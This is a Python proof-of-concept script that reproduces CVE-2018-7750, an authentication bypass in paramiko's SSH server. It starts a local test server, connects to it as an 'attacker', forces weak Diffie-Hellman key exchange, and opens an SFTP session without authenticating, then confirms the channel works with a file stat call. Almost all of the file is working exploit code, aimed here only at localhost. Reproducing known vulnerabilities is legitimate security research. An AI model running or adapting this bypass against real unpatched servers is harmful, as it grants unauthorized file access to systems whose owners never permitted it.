import paramiko
import subprocess
import time
import os

SERVER_SCRIPT_PATH = os.path.join(os.path.dirname(__file__), 'server.py')
SSH_SERVER_COMMAND = ['python', SERVER_SCRIPT_PATH]
host, port = '127.0.0.1', 2222

server_process = subprocess.Popen(SSH_SERVER_COMMAND)
print("Starting target server...")
time.sleep(2)

trans = None
try:
    print(f"Attacker connecting to {host}:{port}...")
    trans = paramiko.Transport((host, port))
    trans.get_security_options().kex = ('diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1')
    trans.start_client()
    print("Attacker: Attempting to open SFTP session directly, bypassing auth...")
    sftp = paramiko.SFTPClient.from_transport(trans)

    # This part of the code can now be executed successfully!
    print("\n>>> Authentication Bypassed Successfully! <<<")
    # To prove the SFTP channel is truly usable, we perform a stat operation.
    # It will throw an IOError because the file doesn't exist,
    # but this proves that the SFTP communication was successful.
    try:
        sftp.stat('proof.txt')
    except IOError as e:
        print(f"Successfully interacted with SFTP service (even though file does not exist): {e}")

    print("\nCVE-2018-7750 PoC reproduced successfully!")

except Exception as e:
    print(f"PoC execution error: {e}")

finally:
    print("\nCleaning up environment...")
    if 'sftp' in locals() and sftp: sftp.close()
    if 'trans' in locals() and trans: trans.close()
    try:
        server_process.wait(timeout=5)
        print("Target server process has exited.")
    except subprocess.TimeoutExpired:
        print("Timeout waiting for server, terminating forcefully.")
        server_process.terminate()
    print("PoC script finished.")